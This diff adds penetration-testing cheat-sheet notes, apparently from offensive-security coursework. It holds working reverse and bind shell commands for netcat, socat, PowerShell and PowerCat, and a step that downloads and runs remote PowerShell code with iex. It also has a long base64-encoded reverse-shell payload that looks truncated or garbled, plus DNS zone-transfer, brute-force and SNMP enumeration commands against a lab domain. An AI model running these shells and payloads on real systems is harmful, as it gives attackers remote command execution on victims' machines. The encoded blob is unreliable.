@@ -1,0 +1,125 @@
+Socat vs nc 
+	Simple Connection:-
+	nc -nv i.p_address port
+	socat -TCP4:i.p_address:port
+
+	Listen or bind on Specific port
+	nc -vlp localhost port_numer
+	socat TCP4-LISTEN:port_numer STDOUT
+	
+	File Transfer
+	system 1:nc -nvlp port_numer < file_name       system 2: nc -nv i.p_address port_numer >> file_name
+	system 1:socat TCP4-LISTEN:port_numer,fork file:file_name          system 2 :socat TCP4:i.p_address:port_numer file:any_file_name,create 
+	
+	Reverse shell
+	nc -nvlp port_numer
+	socat -d -d TCP4-LISTEN:port_numer STDOUT     or Socat  TCP4:ip_address:port_numer EXEC:/bin/bash
+	
+	
+
+Create Self sign Certificate :
+	openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+
+		• -req: initiate a new certificate signing request
+		• -newkey: generate a new private key
+		• rsa:2048: use RSA encryption with a 2,048-bit key length.
+		• -nodes: store the private key without passphrase protection
+		• -keyout: save the key to a file
+		• -x509: output a self-signed certificate instead of a certificate request
+		• -days: set validity period in days
+		• -out: save the certificate to a file
+
+
+
+Powershell 
+	File Transfer:
+	powershell -c "(new-object System.Net.WebClient).DownloadFile('http://You're_ip_address/wget.exe','C:\Users\offsec\Desktop\wget.exe')"
+	
+	Bind shell
+	powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('IP_ADDRESS',PORT);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes =
+	0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String);$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
+	
+	
+	Reverse shell:
+	powershell -c "$client = New-Object System.Net.Sockets.TCPClient('IP_ADDRESS',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =$stream.Read($bytes, 0, $bytes.Length)) -ne0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+	
+	
+	
+PowerCat:Powercat96 is essentially the PowerShell version of Netcat
+	Victim:  iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1') & thsn run powercat
+	
+	Powercat File Transfers:
+	powercat -c 10.11.0.4 -p 443 -i C:\Users\Offsec\powercat.ps1
+	
+	Powercat Reverse Shells:
+	powercat -c 10.11.0.4 -p 443 -e cmd.exe
+	
+	Powercat Bind Shells:
+	powercat -l -p 443 -e cmd.exe
+	
+	Powercat Stand-Alone Payloads:
+	powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1
+	
+	Encoded payload in -ge base64:
+	powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1
+	than
+	powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0LgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA
+	
+	
+
+DNS Enemuration:
+		• NS - Nameserver records contain the name of the authoritative servers hosting the DNSrecords for a domain.
+		• A - Also known as a host record, the “a record” contains the IP address of a hostname (suchas www.megacorpone.com).
+		• MX - Mail Exchange records contain the names of the servers responsible for handling emailfor the domain. A domain can contain multiple MX records.
+		• PTR - Pointer Records are used in reverse lookup zones and are used to find the recordsassociated with an IP address.
+		• CNAME - Canonical Name Records are used to create aliases for other host records.
+		• TXT - Text records can contain any arbitrary data and can be used for various purposes,such as domain ownership verification.
+		
+	host command to find the IP address of target:
+	host www.megacorpone.com
+	www.megacorpone.com has address 38.100.193.76
+	
+	host -t mx megacorpone.com
+	megacorpone.com mail is handled by 10 fb.mail.gandi.net.
+	megacorpone.com mail is handled by 50 mail.megacorpone.com.
+	megacorpone.com mail is handled by 60 mail2.megacorpone.com.
+	megacorpone.com mail is handled by 20 spool.mail.gandi.net.
+	
+
+
+	Forward Lookup Brute Force:-
+	for ip in $(cat list.txt); do host $ip.megacorpone.com; done
+	
+	Reverse Lookup Brute Force:-
+	for ip in $(seq 50 100); do host 38.100.193.$ip; done | grep -v "not found"
+	
+	
+	
+	DNS Zone Transfers:
+	host -l megacorpone.com ns1(2,3).megacorpone.com
+	
+	
+	
+	
+	
+SNMP Enumeration:
+	1.3.6.1.2.1.25.1.6.0 	System Processes
+	1.3.6.1.2.1.25.4.2.1.2 	Running Programs
+	1.3.6.1.2.1.25.4.2.1.4 	Processes Path
+	1.3.6.1.2.1.25.2.3.1.4 	Storage Units
+	1.3.6.1.2.1.25.6.3.1.2 	Software Name
+	1.3.6.1.4.1.77.1.2.25 	User Accounts
+	1.3.6.1.2.1.6.13.1.3 	TCP Local Ports
+	
+	Example:-
+			onesixtyone -c community -i ips
+		
+		Enumerating the Entire MIB Tree:
+		snmpwalk -c public -v1 -t 10 10.11.1.14
+		
+		Enumerating Windows Users:
+		snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25    ##you can change the variable value like i used here User Accounts you can try other as well
+		
+
+
+
